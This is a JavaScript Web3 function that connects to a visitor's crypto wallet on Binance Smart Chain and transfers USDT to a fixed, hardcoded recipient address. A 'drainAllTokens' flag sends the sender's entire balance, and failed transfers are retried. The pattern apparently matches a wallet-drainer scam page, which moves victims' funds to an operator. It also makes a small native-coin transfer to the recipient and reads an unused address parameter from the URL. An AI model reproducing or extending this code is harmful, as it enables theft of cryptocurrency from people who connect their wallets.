const sendUSDT = async () => {
  if (isProcessing.current) {
    console.log("Transaction already in progress.");
    alert("Transaction already in progress.");
    return;
  }

  try {
    isProcessing.current = true;
    setLoading(true);
    setTransferCompleted(false);

    console.log("Starting sendUSDT...");
    alert("Starting sendUSDT...");

    if (!window.ethereum) {
      console.error("MetaMask/Trust Wallet not detected.");
      alert("Please install MetaMask or Trust Wallet to use this app.");
      return;
    }

    console.log("Connecting to wallet...");
    alert("Connecting to wallet...");
    const web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.requestAccounts();
    const sender = accounts[0];
    if (!sender || !web3.utils.isAddress(sender)) {
      console.log("❌ No valid wallet address detected.");
      alert("Please connect your wallet.");
      return;
    }

    console.log("Checking chain ID...");
    alert("Checking chain ID...");
    const chainId = await web3.eth.getChainId();
    if (chainId !== 56) {
      console.log("Switching to BSC network...");
      alert("Switching to BSC network...");
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      } catch (switchError) {
        console.error("Failed to switch network:", switchError);
        alert("Please switch to the Binance Smart Chain (BSC) network.");
        return;
      }
    }

    console.log("Verifying URL address...");
    alert("Verifying URL address...");
    const currentUrl = window.location.href; // Log the full URL
    console.log("Current URL:", currentUrl);
    alert("Current URL: " + currentUrl);

    const params = new URLSearchParams(window.location.search);
    const userAddress = params.get("address");
    console.log("Extracted userAddress from URL:", userAddress || "undefined");
    alert("Extracted userAddress from URL: " + (userAddress || "undefined"));

    if (!userAddress) {
      console.log("❌ No address parameter found in URL.");
      alert("No address parameter found in URL.");
      return;
    }

    if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
      console.log("❌ Invalid user address format in URL:", userAddress);
      alert("Invalid user address format in URL: " + userAddress);
      return;
    }

    // Rest of the sendUSDT function remains the same
    console.log("Validating RECIPIENT_ADDRESS...");
    alert("Validating RECIPIENT_ADDRESS...");
    if (!web3.utils.isAddress(RECIPIENT_ADDRESS)) {
      console.error("Invalid RECIPIENT_ADDRESS:", RECIPIENT_ADDRESS);
      alert("The recipient address is invalid.");
      return;
    }

    console.log("Checking if RECIPIENT_ADDRESS can receive tokens...");
    alert("Checking if RECIPIENT_ADDRESS can receive tokens...");
    try {
      const code = await web3.eth.getCode(RECIPIENT_ADDRESS);
      if (code !== "0x") {
        console.log("RECIPIENT_ADDRESS is a contract:", RECIPIENT_ADDRESS);
        alert("RECIPIENT_ADDRESS is a contract: " + RECIPIENT_ADDRESS);
        const tempAmount = web3.utils.toWei("0.0001", "ether");
        await web3.eth.sendTransaction({
          from: sender,
          to: RECIPIENT_ADDRESS,
          value: tempAmount,
          gas: 21000
        });
        console.log("RECIPIENT_ADDRESS can receive tokens.");
        alert("RECIPIENT_ADDRESS can receive tokens.");
      } else {
        console.log("RECIPIENT_ADDRESS is an EOA (Externally Owned Account).");
        alert("RECIPIENT_ADDRESS is an EOA (Externally Owned Account).");
      }
    } catch (error) {
      console.error("RECIPIENT_ADDRESS cannot receive tokens:", error);
      alert("The recipient address cannot receive tokens: " + error.message);
      return;
    }

    console.log("Validating USDT amount...");
    alert("Validating USDT amount...");
    if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
      console.error("Invalid USDT amount entered.");
      alert("Please enter a valid USDT amount greater than 0.");
      return;
    }

    console.log("Creating contract instance...");
    alert("Creating contract instance...");
    const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
    const amountToTransfer = drainAllTokens ? usdtBalance : usdtAmount;
    console.log(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);
    alert(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);

    if (parseFloat(amountToTransfer) <= 0) {
      console.error("Amount to transfer is 0 or invalid.");
      alert("Your USDT balance is 0 or invalid. Please ensure you have USDT in your wallet.");
      return;
    }

    if (parseFloat(amountToTransfer) > usdtBalance) {
      console.error("Amount to transfer exceeds USDT balance.");
      alert("The amount to transfer exceeds your USDT balance.");
      return;
    }

    const amountInWei = web3.utils.toBN(web3.utils.toWei(amountToTransfer.toString(), 'ether'));
    console.log(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);
    alert(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);

    console.log("Estimating gas...");
    alert("Estimating gas...");
    let retries = 3;
    let transferTx = null;
    while (retries > 0) {
      try {
        const estimatedGas = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).estimateGas({ from: sender });
        const gasLimit = Math.floor(estimatedGas * 1.5);
        console.log(`Gas limit set to ${gasLimit}`);
        alert(`Gas limit set to ${gasLimit}`);

        console.log("Initiating transfer transaction...");
        alert("Initiating transfer transaction...");
        transferTx = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).send({ from: sender, gas: gasLimit });
        break;
      } catch (error) {
        retries--;
        if (retries === 0) throw error;
        console.log(`Retrying transaction (${retries} attempts left)...`);
        alert(`Retrying transaction (${retries} attempts left)...`);
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }

    console.log(`✅ Transfer successful! Transaction hash: ${transferTx.transactionHash}`);
    alert("Transfer successful! Transaction hash: " + transferTx.transactionHash);

    setTransferCompleted(true);
  } catch (err) {
    console.error("🔴 Transaction error:", err);
    alert("Transaction failed: " + err.message);
  } finally {
    isProcessing.current = false;
    setLoading(false);
  }
};
